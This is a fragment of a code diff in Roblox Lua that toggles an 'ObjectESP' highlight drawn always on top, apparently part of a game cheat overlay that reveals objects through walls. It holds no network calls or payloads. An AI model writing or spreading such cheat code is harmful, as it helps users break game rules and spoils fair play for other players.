+                        data.Highlight.Enabled = true
+                        data.Highlight.FillColor = CONFIG.ObjectGradientColor1
+                        data.Highlight.FillTransparency = CONFIG.ObjectFillTransparency
+                        data.Highlight.OutlineColor = objectColor
+                        data.Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+                    else
+                        data.Highlight.Enabled = false
+                    end
+                else
+                    HideObjectESP(data)
+                end
+            else
+                HideObjectESP(data)
+            end
+        else
+            HideObjectESP(data)
         end
     end
 end)
